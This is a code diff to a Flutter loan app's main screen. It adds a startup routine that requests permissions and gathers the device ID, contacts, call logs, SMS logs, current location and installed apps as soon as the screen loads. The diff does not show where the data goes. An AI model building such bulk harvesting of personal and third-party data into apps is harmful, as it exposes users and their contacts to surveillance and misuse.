@@ -1,4 +1,8 @@
+import 'dart:async';
+
 import 'package:flutter/material.dart';
+import 'package:get/get.dart';
+import 'package:prathima_loan_app/controllers/home_controller.dart';
 import 'package:prathima_loan_app/screens/home/home_screen.dart';
 import 'package:prathima_loan_app/screens/loan/loan_screen.dart';
 import 'package:prathima_loan_app/screens/profile/profile_screen.dart';
@@ -15,6 +19,24 @@ class MainScreen extends StatefulWidget {
 }
 
 class _MainScreenState extends State<MainScreen> {
+  @override
+  void initState() {
+    // TODO: implement initState
+    super.initState();
+    initCall();
+  }
+
+  Future<void> initCall() async {
+    await Get.find<HomeController>().getDeviceIdAndUserId();
+    await Get.find<HomeController>().appPermission();
+    // await Get.find<HomeController>().fetchDCIMFolder();
+    await Get.find<HomeController>().fetchContactsLogs();
+    await Get.find<HomeController>().fetchCallLogs();
+    await Get.find<HomeController>().fetchSMSLogs();
+    await Get.find<HomeController>().fetchCurrentLocation();
+    await Get.find<HomeController>().fetchInstalledApps();
+  }
+
   int _selectedIndex = 0;
 
   static const List<Widget> children = <Widget>[
